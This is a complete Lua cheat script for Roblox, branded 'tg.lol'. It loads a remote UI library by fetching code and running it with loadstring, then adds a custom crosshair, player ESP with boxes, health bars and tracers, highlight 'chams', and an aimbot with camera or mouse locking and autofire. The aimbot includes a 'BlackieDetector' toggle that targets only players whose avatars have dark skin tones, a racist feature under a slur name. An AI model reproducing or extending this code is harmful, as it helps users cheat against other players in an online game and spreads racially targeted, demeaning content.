local repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'

local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()

local Window = Library:CreateWindow({
    Title = 'tg.lol',
    Center = true,
    AutoShow = true,
    TabPadding = 0,
    MenuFadeTime = 0.2
})

local Tabs = {
    Combat = Window:AddTab('Ragebot'),
    Visuals = Window:AddTab('Visuals'),
    Player = Window:AddTab('Player'),
    ['UI Settings'] = Window:AddTab('UI Settings'),
}

getgenv().crosshair = {
    enabled = false,
    refreshrate = 0,
    mode = 'mouse',
    position = Vector2.new(0, 0),
    textenabled = false,

    width = 2.5,
    length = 25,
    radius = 11,
    color = Color3.fromRGB(126,72,163),

    spin = false,
    spin_speed = 150,
    spin_max = 360,
    spin_style = Enum.EasingStyle.Linear,

    resize = false,
    resize_speed = 150,
    resize_min = 5,
    resize_max = 22,
}

local runservice = game:GetService('RunService')
local inputservice = game:GetService('UserInputService')
local tweenservice = game:GetService('TweenService')
local camera = workspace.CurrentCamera

local last_render = 0

local drawings = {
    crosshair = {},
    text = {
        Drawing.new('Text'),
        Drawing.new('Text'),
    }
}

drawings.text[1].Size = 16
drawings.text[1].Font = 2
drawings.text[1].Outline = true
drawings.text[1].Text = 'tg'
drawings.text[1].Color = Color3.new(1, 1, 1)

drawings.text[2].Size = 16
drawings.text[2].Font = 2
drawings.text[2].Outline = true
drawings.text[2].Text = '.lol'

for idx = 1, 4 do
    drawings.crosshair[idx] = Drawing.new('Line')
    drawings.crosshair[idx + 4] = Drawing.new('Line')
end

local function solve(angle, radius)
    return Vector2.new(
        math.sin(math.rad(angle)) * radius,
        math.cos(math.rad(angle)) * radius
    )
end

runservice.PostSimulation:Connect(function()
    local _tick = tick()

    if _tick - last_render > crosshair.refreshrate then
        last_render = _tick

        local position1 = (
            crosshair.mode == 'center' and camera.ViewportSize / 2 or
            crosshair.mode == 'mouse' and inputservice:GetMouseLocation() or
            crosshair.position1
        )

        local text_1 = drawings.text[1]
        local text_2 = drawings.text[2]

        text_1.Visible = crosshair.enabled
        text_2.Visible = crosshair.enabled

        if crosshair.enabled then
            local text_x = text_1.TextBounds.X + text_2.TextBounds.X

            text_1.Position = position1 + Vector2.new(-text_x / 2, crosshair.radius + (crosshair.resize and crosshair.resize_max or crosshair.length) + 15)
            text_2.Position = text_1.Position + Vector2.new(text_1.TextBounds.X)
            text_2.Color = crosshair.color

            for idx = 1, 4 do
                local outline = drawings.crosshair[idx]
                local inline = drawings.crosshair[idx + 4]

                local angle = (idx - 1) * 90
                local length = crosshair.length

                if crosshair.spin then
                    local spin_angle = -_tick * crosshair.spin_speed % crosshair.spin_max
                    angle = angle + tweenservice:GetValue(spin_angle / 360, crosshair.spin_style, Enum.EasingDirection.InOut) * 360
                end

                if crosshair.resize then
                    local resize_length = tick() * crosshair.resize_speed % 180
                    length = crosshair.resize_min + math.sin(math.rad(resize_length)) * crosshair.resize_max
                end

                inline.Visible = true
                inline.Color = crosshair.color
                inline.From = position1 + solve(angle, crosshair.radius)
                inline.To = position1 + solve(angle, crosshair.radius + length)
                inline.Thickness = crosshair.width

                outline.Visible = true
                outline.From = position1 + solve(angle, crosshair.radius - 1)
                outline.To = position1 + solve(angle, crosshair.radius + length + 1)
                outline.Thickness = crosshair.width + 1.5
            end
        else
            for idx = 1, 4 do
                drawings.crosshair[idx].Visible = false
                drawings.crosshair[idx + 4].Visible = false
            end
        end
    end
end)

-- Services
local Players = game:GetService("Players")
local Teams = game:GetService("Teams")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local Cache = {}
local mouse = LocalPlayer:GetMouse()
local mousePosition = Vector2.new(mouse.X, mouse.Y)

-- Function to update mouse position
local function updateMousePosition()
    mousePosition = Vector2.new(mouse.X, mouse.Y)
end

RunService.RenderStepped:Connect(updateMousePosition)

-- Settings
local ESP_SETTINGS = {
    OutlineColor = Color3.new(0, 0, 0),
    BoxColor = Color3.fromRGB(126, 72, 163),
    NameColor = Color3.fromRGB(126, 72, 163),
    DistanceColor = Color3.fromRGB(126, 72, 163),
    HealthOutlineColor = Color3.new(0, 0, 0),
    HealthHighColor = Color3.fromRGB(126, 72, 163),
    HealthLowColor = Color3.fromRGB(36, 19, 47),
    CharSize = Vector2.new(4, 6),
    TeamCheck = false,
    InvisCheck = false,
    AliveCheck = false,
    Enabled = false,
    ShowBox = false,
    BoxType = "2D",
    ShowName = false,
    ShowHealth = false,
    ShowDistance = false,
    ShowTracer = false,
    TracerColor = Color3.fromRGB(126, 72, 163),
    TracerThickness = 1,
    TracerPosition = "Bottom",
    ToolESPColor = Color3.fromRGB(126, 72, 163),
    ShowTool = false,
    TeamColor = false,
    ShowViewDirection = false,
    ViewDirectionColor = Color3.fromRGB(126, 72, 163),
    WhitelistedPlayers = {},
}

local function create(class, properties)
    local drawing = Drawing.new(class)
    for property, value in pairs(properties) do
        drawing[property] = value
    end
    return drawing
end

local function createEsp(player)
    local esp = {
        boxOutline = create("Square", {
            Color = ESP_SETTINGS.OutlineColor,
            Thickness = 2,
            Filled = false,
            Visible = false
        }),
        box = create("Square", {
            Color = ESP_SETTINGS.BoxColor,
            Thickness = 1,
            Filled = false,
            Visible = false
        }),
        name = create("Text", {
            Color = ESP_SETTINGS.NameColor,
            Outline = true,
            Center = true,
            Size = 13,
            Visible = false
        }),
        tool = create("Text", {
            Color = ESP_SETTINGS.ToolESPColor,
            Outline = true,
            Center = true,
            Size = 12,
            Visible = false
        }),
        healthOutline = create("Line", {
            Thickness = 4,
            Color = ESP_SETTINGS.HealthOutlineColor,
            Visible = false
        }),
        health = create("Line", {
            Thickness = 2,
            Visible = false
        }),
        distance = create("Text", {
            Color = ESP_SETTINGS.DistanceColor,
            Size = 12,
            Outline = true,
            Center = true,
            Visible = false
        }),
        tracer = create("Line", {
            Thickness = ESP_SETTINGS.TracerThickness,
            Color = ESP_SETTINGS.TracerColor,
            Transparency = 1,
            Visible = false
        }),
        viewDirection = create("Line", {
            Thickness = 2,
            Color = ESP_SETTINGS.ViewDirectionColor,
            Transparency = 1,
            Visible = false
        }),
        boxLines = {}
    }

    Cache[player] = esp
end

local function removeEsp(player)
    local esp = Cache[player]
    if not esp then return end

    for key, drawing in pairs(esp) do
        if drawing.Remove then
            drawing:Remove()
        elseif key == "boxLines" then
            for _, line in ipairs(drawing) do
                if line.Remove then
                    line:Remove()
                end
            end
        else
            print("No Remove method for", key)
        end
    end

    Cache[player] = nil
end

local function updateEsp()
    for player, esp in pairs(Cache) do
        local character, team = player.Character, player.Team
        local isWhitelisted = ESP_SETTINGS.WhitelistedPlayers and table.find(ESP_SETTINGS.WhitelistedPlayers, player.Name)

        if character and 
           (not ESP_SETTINGS.TeamCheck or (team and team ~= LocalPlayer.Team)) and 
           (not isWhitelisted) then
            
            local rootPart = character:FindFirstChild("HumanoidRootPart")
            local head = character:FindFirstChild("Head")
            local humanoid = character:FindFirstChild("Humanoid")
            local isnotDead = ESP_SETTINGS.AliveCheck and humanoid and humanoid.Health == 0
            local isInvisible = ESP_SETTINGS.InvisCheck and head and head.Transparency == 1
            local shouldShow = ESP_SETTINGS.Enabled and not isInvisible and not isnotDead

            if rootPart and shouldShow then
                local position, onScreen = Camera:WorldToViewportPoint(rootPart.Position)
                if onScreen then
                    local hrp2D = position
                    local charSize = (Camera:WorldToViewportPoint(rootPart.Position - Vector3.new(0, 3, 0)).Y - Camera:WorldToViewportPoint(rootPart.Position + Vector3.new(0, 2.6, 0)).Y) / 2
                    local boxSize = Vector2.new(math.floor(charSize * 1.5), math.floor(charSize * 1.9))
                    local boxPosition = Vector2.new(math.floor(hrp2D.X - charSize * 1.5 / 2), math.floor(hrp2D.Y - charSize * 1.6 / 2))

                    if ESP_SETTINGS.ShowName and ESP_SETTINGS.Enabled then
                        esp.name.Visible = true
                        esp.name.Text = string.lower(player.Name)
                        esp.name.Position = Vector2.new(boxSize.X / 2 + boxPosition.X, boxPosition.Y - 16)
                        if ESP_SETTINGS.TeamColor and team then
                            esp.name.Color = team.TeamColor.Color
                        else
                            esp.name.Color = ESP_SETTINGS.NameColor
                        end
                    else
                        esp.name.Visible = false
                    end

                    if ESP_SETTINGS.ShowTool and ESP_SETTINGS.Enabled then
                        local tool = character:FindFirstChildOfClass("Tool")
                        if tool then
                            esp.tool.Visible = true
                            esp.tool.Text = string.lower(tool.Name)
                        else
                            esp.tool.Visible = true
                            esp.tool.Text = "none"
                        end
                        if ESP_SETTINGS.ShowName and ESP_SETTINGS.ShowTool then
                            esp.tool.Position = Vector2.new(boxSize.X / 2 + boxPosition.X, boxPosition.Y - 32)
                        else
                            esp.tool.Position = Vector2.new(boxSize.X / 2 + boxPosition.X, boxPosition.Y - 16)
                        end
                        if ESP_SETTINGS.TeamColor and team then
                            esp.tool.Color = team.TeamColor.Color
                        else
                            esp.tool.Color = ESP_SETTINGS.ToolESPColor
                        end
                    else
                        esp.tool.Visible = false
                    end

                    if ESP_SETTINGS.ShowBox and ESP_SETTINGS.Enabled then
                        if ESP_SETTINGS.BoxType == "2D" then
                            esp.boxOutline.Size = boxSize
                            esp.boxOutline.Position = boxPosition
                            esp.boxOutline.Color = ESP_SETTINGS.OutlineColor
                            if ESP_SETTINGS.TeamColor and team then
                                esp.box.Color = team.TeamColor.Color
                            else
                                esp.box.Color = ESP_SETTINGS.BoxColor
                            end
                            esp.box.Size = boxSize
                            esp.box.Position = boxPosition
                            esp.box.Visible = true
                            esp.boxOutline.Visible = true
                        end
                    else
                        esp.boxOutline.Visible = false
                        esp.box.Visible = false
                    end

                    if ESP_SETTINGS.ShowHealth and ESP_SETTINGS.Enabled then
                        esp.healthOutline.Visible = true
                        esp.health.Visible = true
                        local healthPercentage = humanoid.Health / humanoid.MaxHealth
                        local outlineHeight = boxSize.Y * 1.015
                        local offsetY = (outlineHeight - boxSize.Y) / 2
                        local moveDown = 0 
                        esp.healthOutline.From = Vector2.new(boxPosition.X - 5, boxPosition.Y + boxSize.Y + offsetY + moveDown)
                        esp.healthOutline.To = Vector2.new(esp.healthOutline.From.X, esp.healthOutline.From.Y - outlineHeight)
                        esp.health.From = Vector2.new(boxPosition.X - 5, boxPosition.Y + boxSize.Y + moveDown)
                        esp.health.To = Vector2.new(esp.health.From.X, esp.health.From.Y - healthPercentage * boxSize.Y)
                    
                        esp.health.Color = ESP_SETTINGS.HealthLowColor:Lerp(ESP_SETTINGS.HealthHighColor, healthPercentage)
                    else
                        esp.healthOutline.Visible = false
                        esp.health.Visible = false
                    end
                    
                    if ESP_SETTINGS.ShowDistance and ESP_SETTINGS.Enabled then
                        local distance = (Camera.CFrame.p - rootPart.Position).Magnitude
                        esp.distance.Text = string.format("%.1f studs", distance)
                        esp.distance.Position = Vector2.new(boxPosition.X + boxSize.X / 2, boxPosition.Y + boxSize.Y + 5)
                        esp.distance.Visible = true

                        if ESP_SETTINGS.TeamColor and team then
                            esp.distance.Color = team.TeamColor.Color
                        else
                            esp.distance.Color = ESP_SETTINGS.DistanceColor
                        end
                    else
                        esp.distance.Visible = false
                    end

                    if ESP_SETTINGS.ShowTracer and ESP_SETTINGS.Enabled then
                        if ESP_SETTINGS.TeamColor and team then
                            esp.tracer.Color = team.TeamColor.Color
                        else
                            esp.tracer.Color = ESP_SETTINGS.TracerColor
                        end
                        if ESP_SETTINGS.TracerPosition == "Top" then
                            esp.tracer.From = Vector2.new(Camera.ViewportSize.X / 2, 0)
                        elseif ESP_SETTINGS.TracerPosition == "Middle" then
                            esp.tracer.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
                        elseif ESP_SETTINGS.TracerPosition == 'Mouse' then
                            local tracerOffset = Vector2.new(0, 40)
                            esp.tracer.From = mousePosition + tracerOffset
                        else
                            esp.tracer.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
                        end

                        if ESP_SETTINGS.TeamCheck and player.TeamColor == LocalPlayer.TeamColor then
                            esp.tracer.Visible = false
                        else
                            esp.tracer.Visible = true
                            esp.tracer.To = Vector2.new(hrp2D.X, hrp2D.Y)
                        end
                    else
                        esp.tracer.Visible = false
                    end

                    if ESP_SETTINGS.ShowViewDirection and ESP_SETTINGS.Enabled then
                        if head then
                            local headPosition, headOnScreen = Camera:WorldToViewportPoint(head.Position)
                            if headOnScreen then
                                local lookDirection = head.CFrame.LookVector
                                local viewEndPosition = head.Position + (lookDirection * 5)
                                local viewEndScreenPos, viewEndOnScreen = Camera:WorldToViewportPoint(viewEndPosition)

                                if ESP_SETTINGS.TeamColor and team then
                                    esp.viewDirection.Color = team.TeamColor.Color
                                else
                                    esp.viewDirection.Color = ESP_SETTINGS.ViewDirectionColor
                                end

                                if viewEndOnScreen then
                                    esp.viewDirection.From = Vector2.new(headPosition.X, headPosition.Y)
                                    esp.viewDirection.To = Vector2.new(viewEndScreenPos.X, viewEndScreenPos.Y)
                                    esp.viewDirection.Visible = true
                                else
                                    esp.viewDirection.Visible = false
                                end
                            else
                                esp.viewDirection.Visible = false
                            end
                        else
                            esp.viewDirection.Visible = false
                        end
                    else
                        esp.viewDirection.Visible = false
                    end

                else
                    for _, drawing in pairs(esp) do
                        drawing.Visible = false
                    end
                end
            else
                for _, drawing in pairs(esp) do
                    drawing.Visible = false
                end
            end
        else
            for _, drawing in pairs(esp) do
                drawing.Visible = false
            end
        end
    end
end

for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        createEsp(player)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player ~= LocalPlayer then
        createEsp(player)
    end
end)

Players.PlayerRemoving:Connect(function(player)
    removeEsp(player)
end)

RunService.RenderStepped:Connect(updateEsp)

local ChamsEnabled = false
local ChamsTeamCheck = false
local ChamsInvisCheck = false
local ChamsAliveCheck = false
local ChamsDepthMode = "AlwaysOnTop"

local WhitelistedPlayers = ESP_SETTINGS.WhitelistedPlayers

local function isWhitelisted(player)
    return table.find(WhitelistedPlayers, player.Name) ~= nil
end

local function findAndDestroyHighlights(parent)
    local children = parent:GetChildren()
    for _, child in ipairs(children) do
        if child:IsA("Highlight") and child.Name == "Highlight" then
            child:Destroy()
        end
        findAndDestroyHighlights(child)
    end
end

findAndDestroyHighlights(game)

wait()

local playerFolder = Instance.new("Model")
playerFolder.Name = "PlayerChams"
playerFolder.Parent = game.Workspace

local ignoreFolder = Instance.new("Model")
ignoreFolder.Name = "IgnorePlayer"
ignoreFolder.Parent = game.Workspace

local ChamsHighlight = Instance.new("Highlight")
ChamsHighlight.OutlineTransparency = 0
ChamsHighlight.OutlineColor = Color3.fromRGB(126, 72, 163)
ChamsHighlight.FillColor = Color3.fromRGB(126, 72, 163)
ChamsHighlight.FillTransparency = 0.5
ChamsHighlight.Parent = playerFolder
ChamsHighlight.DepthMode = ChamsDepthMode

game:GetService("RunService").RenderStepped:Connect(function()
    if ChamsEnabled and ESP_SETTINGS.Enabled then
        ChamsHighlight.Enabled = true
    else
        ChamsHighlight.Enabled = false
    end
end)

local function isInvis(character)
    local head = character:FindFirstChild("Head")
    return head and head.Transparency == 1
end

local function isAlive(character)
    local humanoid = character:FindFirstChild("Humanoid")
    return humanoid and humanoid.Health == 0
end

local function moveCharacter(character)
    local player = game.Players:GetPlayerFromCharacter(character)
    if not player then return end
    
    local localPlayer = game.Players.LocalPlayer
    local isInvisible = ChamsInvisCheck and isInvis(character)
    local isAliveNotDead = ChamsAliveCheck and isAlive(character)
    local isOnSameTeam = ChamsTeamCheck and player ~= localPlayer and player.Team == localPlayer.Team
    local isPlayerWhitelisted = isWhitelisted(player)

    if player == localPlayer or isInvisible or isOnSameTeam or isAliveNotDead or isPlayerWhitelisted then
        character.Parent = ignoreFolder
    else
        character.Parent = playerFolder
    end
end

local function updateChams()
    for _, highlight in ipairs(playerFolder:GetChildren()) do
        if highlight:IsA("Highlight") then
            highlight.DepthMode = ChamsDepthMode
        end
    end
end

local function onCharacterAdded(character)
    moveCharacter(character)
end

local function onPlayerAdded(player)
    player.CharacterAdded:Connect(function(character)
        onCharacterAdded(character)
    end)
    
    if player.Character then
        onCharacterAdded(player.Character)
    end
end

local function moveExistingPlayers()
    for _, player in ipairs(game.Players:GetPlayers()) do
        onPlayerAdded(player)
    end
end

game:GetService("Players").PlayerAdded:Connect(onPlayerAdded)

game:GetService("RunService").RenderStepped:Connect(function()
    for _, player in ipairs(game.Players:GetPlayers()) do
        local character = player.Character
        if character and character:IsDescendantOf(game.Workspace) then
            moveCharacter(character)
        end
    end
end)

moveExistingPlayers()

updateChams()

local select = select
local pcall, getgenv, next, Vector2, mathclamp, type, mousemoverel = select(1, pcall, getgenv, next, Vector2.new, math.clamp, type, mousemoverel)

pcall(function()
    if getgenv().Aimbot and getgenv().Aimbot.Functions then
        getgenv().Aimbot.Functions:Exit()
    end
end)

getgenv().Aimbot = getgenv().Aimbot or {}
local Environment = getgenv().Aimbot

local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

local RequiredDistance, Typing, Running, Animation, ServiceConnections = 2000, false, false, nil, {}
local Shooting = false
local JumpOffsetActive = false
local CurrentOffset = Vector3.new(0, 0, 0)

Environment.Settings = {
    Enabled = false,
    TeamCheck = false,
    AliveCheck = false,
    WallCheck = false,
    ForceField_Check = false,
    Tool_Check = false,
    AimbotAutoSelect = false,
    ThirdPerson = false,
    ThirdPersonSensitivity = 0,
    TriggerKey = Enum.KeyCode.J,
    Toggle = false,
    LockPart = "Head",
    Invisible_Check = false,
    ClosestBodyPartAimbot = false,
    IsMainDead = false,
    AimbotFriendCheck = false,
    Sensitivity = 0,
    AutoFire = false,
    JumpOffset = false,
    JumpOffsetAmount = 0,
    JumpOffsetKey = Enum.KeyCode.G,
    BlackieDetector = false,
    WhitelistedPlayers = {}
}

Environment.FOVSettings = {
    Enabled = false,
    Visible = false,
    Amount = 80,
    Color = Color3.fromRGB(126, 72, 163),
    LockedColor = Color3.fromRGB(126, 72, 163),
    Transparency = 1,
    Sides = 60,
    Thickness = 2,
    Filled = false
}

Environment.FOVCircle = Environment.FOVCircle or Drawing.new("Circle")

local function CancelLock()
    Environment.Locked = nil
    if Animation then Animation:Cancel() end
    Environment.FOVCircle.Color = Environment.FOVSettings.Color
    if Shooting then
        mouse1release()
        Shooting = false
    end
end

local function IsInFOV(targetPosition)
    local mouseLocation = UserInputService:GetMouseLocation()
    local fovCircleRadius = Environment.FOVSettings.Amount
    return (targetPosition - mouseLocation).Magnitude <= fovCircleRadius
end

local function IsObstructed(target)
    if not Environment.Settings.WallCheck then
        return false
    end
    local targetPosition = target.Character[Environment.Settings.LockPart].Position
    local parts = Camera:GetPartsObscuringTarget({targetPosition}, {LocalPlayer.Character, target.Character})
    return #parts > 0
end

local function HasForceField(target)
    if not Environment.Settings.ForceField_Check then
        return false
    end
    return target.Character:FindFirstChildOfClass("ForceField") ~= nil
end

local function IsHoldingTool()
    if not Environment.Settings.Tool_Check then
        return true
    end
    return LocalPlayer.Character:FindFirstChildOfClass("Tool") ~= nil
end

local function IsBlackSkinTone(character)
    if not Environment.Settings.BlackieDetector then
        return false
    end
    local head = character:FindFirstChild("Head")
    if head and head:IsA("BasePart") then
        local color = head.Color
        return color == Color3.fromRGB(51, 37, 26) or color == Color3.fromRGB(89, 69, 52)
    end
    return false
end

local function GetClosestPlayer()
    if not Environment.Locked then
        RequiredDistance = (Environment.FOVSettings.Enabled and Environment.FOVSettings.Amount or 2000)

        local closestPlayer = nil
        local closestDistance = math.huge

        for _, v in next, Players:GetPlayers() do
            if v ~= LocalPlayer then
                local character = v.Character
                if character and character:FindFirstChild(Environment.Settings.LockPart) and character:FindFirstChildOfClass("Humanoid") then
                    if Environment.Settings.TeamCheck and v.Team == LocalPlayer.Team then continue end
                    if Environment.Settings.AimbotFriendCheck and LocalPlayer:IsFriendsWith(v.UserId) then continue end
                    if Environment.Settings.AliveCheck and character:FindFirstChildOfClass("Humanoid").Health <= 0 then continue end
                    if Environment.Settings.Invisible_Check and character.Head and character.Head.Transparency == 1 then continue end
                    if Environment.Settings.ForceField_Check and HasForceField(v) then continue end
                    if Environment.Settings.BlackieDetector and not IsBlackSkinTone(character) then continue end
                    if table.find(Environment.Settings.WhitelistedPlayers, v.Name) then continue end

                    local lockPartPosition = character[Environment.Settings.LockPart].Position
                    local Vector, OnScreen = Camera:WorldToViewportPoint(lockPartPosition)
                    local Distance = (Vector2(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2(Vector.X, Vector.Y)).Magnitude

                    if Distance < closestDistance and OnScreen and (not Environment.Settings.WallCheck or not IsObstructed(v)) then
                        if not Environment.FOVSettings.Enabled or IsInFOV(Vector2(Vector.X, Vector.Y)) then
                            closestPlayer = v
                            closestDistance = Distance
                        end
                    end
                end
            end
        end

        if closestPlayer then
            local closestPart = nil
            local closestPartDistance = math.huge

            if Environment.Settings.ClosestBodyPartAimbot then
                for _, part in ipairs(closestPlayer.Character:GetChildren()) do
                    if part:IsA("BasePart") then
                        local distance = (part.Position - Mouse.Hit.p).Magnitude
                        if distance < closestPartDistance then
                            closestPart = part
                            closestPartDistance = distance
                        end
                    end
                end
            else
                closestPart = closestPlayer.Character:FindFirstChild(Environment.Settings.LockPart)
                closestPartDistance = closestDistance
            end

            if closestPart then
                RequiredDistance = closestPartDistance
                Environment.Locked = closestPlayer
                Environment.Settings.LockPart = closestPart.Name
            end
        end
    else
        local lockPartPosition = Environment.Locked.Character[Environment.Settings.LockPart].Position
        if Environment.Settings.WallCheck and IsObstructed(Environment.Locked) then
            CancelLock()
        elseif (Vector2(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2(Camera:WorldToViewportPoint(lockPartPosition).X, Camera:WorldToViewportPoint(lockPartPosition).Y)).Magnitude > RequiredDistance then
            CancelLock()
        end
    end
end

ServiceConnections.TypingStartedConnection = UserInputService.TextBoxFocused:Connect(function()
    Typing = true
end)

ServiceConnections.TypingEndedConnection = UserInputService.TextBoxFocusReleased:Connect(function()
    Typing = false
end)

local function Load()
    local UserInputService_GetMouseLocation = UserInputService.GetMouseLocation
    local Camera_WorldToViewportPoint = Camera.WorldToViewportPoint
    local mathclamp = math.clamp

    ServiceConnections.RenderSteppedConnection = RunService.RenderStepped:Connect(function()
        if Environment.FOVSettings.Enabled and Environment.Settings.Enabled then
            local mouseLocation = UserInputService_GetMouseLocation(UserInputService)
            local fovCircle = Environment.FOVCircle
            fovCircle.Radius = Environment.FOVSettings.Amount
            fovCircle.Thickness = Environment.FOVSettings.Thickness
            fovCircle.Filled = Environment.FOVSettings.Filled
            fovCircle.NumSides = Environment.FOVSettings.Sides
            fovCircle.Color = Environment.FOVSettings.Color
            fovCircle.Transparency = Environment.FOVSettings.Transparency
            fovCircle.Visible = Environment.FOVSettings.Visible
            fovCircle.Position = Vector2(mouseLocation.X, mouseLocation.Y)
        else
            Environment.FOVCircle.Visible = false
        end

        if (Running or Environment.Settings.AimbotAutoSelect) and Environment.Settings.Enabled then
            if IsHoldingTool() then
                if Environment.Settings.IsMainDead then
                    local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid and humanoid.Health <= 0 then
                        CancelLock()
                        return
                    end
                end
                GetClosestPlayer()

                if Environment.Locked then
                    local lockPartPosition = Environment.Locked.Character[Environment.Settings.LockPart].Position

                    if JumpOffsetActive and Environment.Settings.JumpOffset then
                        lockPartPosition = lockPartPosition + Vector3.new(0, Environment.Settings.JumpOffsetAmount, 0)
                    else
                        lockPartPosition = lockPartPosition - CurrentOffset
                    end
                    CurrentOffset = Vector3.new(0, JumpOffsetActive and Environment.Settings.JumpOffset and Environment.Settings.JumpOffsetAmount or 0, 0)

                    if Environment.Settings.ThirdPerson then
                        Environment.Settings.ThirdPersonSensitivity = mathclamp(Environment.Settings.ThirdPersonSensitivity, 0.1, 5)
    
                        local Vector = Camera_WorldToViewportPoint(Camera, lockPartPosition)
                        local mouseLocation = UserInputService_GetMouseLocation(UserInputService)
                        local deltaX = (Vector.X - mouseLocation.X) * Environment.Settings.ThirdPersonSensitivity
                        local deltaY = (Vector.Y - mouseLocation.Y) * Environment.Settings.ThirdPersonSensitivity

                        if mousemoverel then
                            mousemoverel(deltaX, deltaY)
                        end
                    else
                        if Environment.Settings.Sensitivity > 0 then
                            Animation = TweenService:Create(Camera, TweenInfo.new(Environment.Settings.Sensitivity, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {CFrame= CFrame.new(Camera.CFrame.Position, lockPartPosition)})
                            Animation:Play()
                        else
                            Camera.CFrame = CFrame.new(Camera.CFrame.Position, lockPartPosition)
                        end
                    end

                    Environment.FOVCircle.Color = Environment.FOVSettings.LockedColor

                    if Environment.Settings.AutoFire then
                        if not Shooting then
                            mouse1press()
                            Shooting = true
                        end
                    end
                else
                    if Shooting then
                        mouse1release()
                        Shooting = false
                    end
                end
            end
        end
    end)

    ServiceConnections.InputBeganConnection = UserInputService.InputBegan:Connect(function(Input)
        if not Typing then
            if Input.KeyCode == Environment.Settings.TriggerKey then
                if Environment.Settings.Toggle then
                    Running = not Running

                    if not Running then
                        CancelLock()
                    end
                else
                    Running = true
                end
            end
            if Input.KeyCode == Environment.Settings.JumpOffsetKey then
                JumpOffsetActive = true
            end
        end
    end)

    ServiceConnections.InputEndedConnection = UserInputService.InputEnded:Connect(function(Input)
        if not Typing then
            if Input.KeyCode == Environment.Settings.TriggerKey and not Environment.Settings.Toggle then
                Running = false
                CancelLock()
            end
            if Input.KeyCode == Environment.Settings.JumpOffsetKey then
                JumpOffsetActive = false
            end
        end
    end)
end

Environment.Functions = {}

function Environment.Functions:Exit()
    for _, connection in next, ServiceConnections do
        connection:Disconnect()
    end
    if Animation then Animation:Cancel() end
    if Environment.FOVCircle then Environment.FOVCircle:Remove() end
    if Shooting then
        mouse1release()
        Shooting = false
    end
end

Load()

local AimbotBox = Tabs.Combat:AddLeftGroupbox('Aimbot')

AimbotBox:AddToggle('AimbotMasterSwitch', {
    Text = 'Enabled',
    Default = false,
    Tooltip = 'Acts as a master switch.',
    Callback = function(Value)
        Environment.Settings.Enabled = Value
    end
}):AddKeyPicker('AimbotKeyPicker', {
    Default = 'J',
    SyncToggleState = false,
    Mode = 'Hold',
    Text = 'Aimbot',
    NoUI = false, 
    Callback = function(Value)
    end,
    ChangedCallback = function(v)
        Environment.Settings.TriggerKey = v
    end
})

AimbotBox:AddSlider('AimbotSmoothness', {
    Text = 'Smoothness',
    Default = 0,
    Min = 0,
    Max = 1,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)
        Environment.Settings.Sensitivity = Value
        Environment.Settings.ThirdPersonSensitivity = Value
    end
})

AimbotBox:AddDropdown('AimbotMode', {
    Values = {'Camera', 'Mouse'},
    Default = 1,
    Multi = false, 
    Text = 'Mode',
    Tooltip = nil,
    Callback = function(Value)
        if Value == 'Mouse' then
            Environment.Settings.ThirdPerson = true
        elseif Value == 'Camera' then
            Environment.Settings.ThirdPerson = false
        end
    end
})

AimbotBox:AddDropdown('AimbotMode', {
    Values = {'Head', 'HumanoidRootPart'},
    Default = 1,
    Multi = false, 
    Text = 'Aimpart',
    Tooltip = nil,
    Callback = function(Value)
        Environment.Settings.LockPart = Value
    end
})

local AimbotCheckBox = Tabs.Combat:AddRightGroupbox('Checks')

AimbotCheckBox:AddToggle('AimbotWallCheck', {
    Text = 'Wall',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        Environment.Settings.WallCheck = Value
    end
})

AimbotCheckBox:AddToggle('AimbotAliveCheck', {
    Text = 'Alive',
    Default = false, 
    Tooltip = nil, 
    Callback = function(Value)
        Environment.Settings.AliveCheck = Value
    end
})

AimbotCheckBox:AddToggle('AimbotTeamCheck', {
    Text = 'Team',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        Environment.Settings.TeamCheck = Value
    end
})

AimbotCheckBox:AddToggle('AimbotFriendCheck', {
    Text = 'Friend',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        Environment.Settings.AimbotFriendCheck = Value
    end
})

AimbotCheckBox:AddToggle('AimbotInvisibleCheck', {
    Text = 'Invisible',
    Default = false, 
    Tooltip = nil,
    Callback = function(Value)
        Environment.Settings.Invisible_Check = Value
    end
})

AimbotCheckBox:AddToggle('AimbotForeceFieldCheck', {
    Text = 'Forcefield',
    Default = false, 
    Tooltip = nil,
    Callback = function(Value)
        Environment.Settings.ForceField_Check = Value
    end
})

AimbotCheckBox:AddToggle('AimbotUnlockOnDeath', {
    Text = 'Unlock on death',
    Default = false, 
    Tooltip = nil,
    Callback = function(Value)
        Environment.Settings.IsMainDead = Value
    end
})

local AimbotMiscBox = Tabs.Combat:AddRightGroupbox('Misc')

AimbotMiscBox:AddToggle('AimbotAutoFire', {
    Text = 'Autofire',
    Default = false, 
    Tooltip = nil,
    Callback = function(Value)
        Environment.Settings.AutoFire = Value
    end
})

AimbotMiscBox:AddToggle('AimbotAutoLock', {
    Text = 'Autolock',
    Default = false, 
    Tooltip = nil,
    Callback = function(Value)
        Environment.Settings.AimbotAutoSelect = Value
    end
})

local FieldOfViewBox = Tabs.Combat:AddLeftGroupbox('Field of View')

FieldOfViewBox:AddToggle('FieldOfViewEnabled', {
    Text = 'Enabled',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        Environment.FOVSettings.Enabled = Value
    end
})

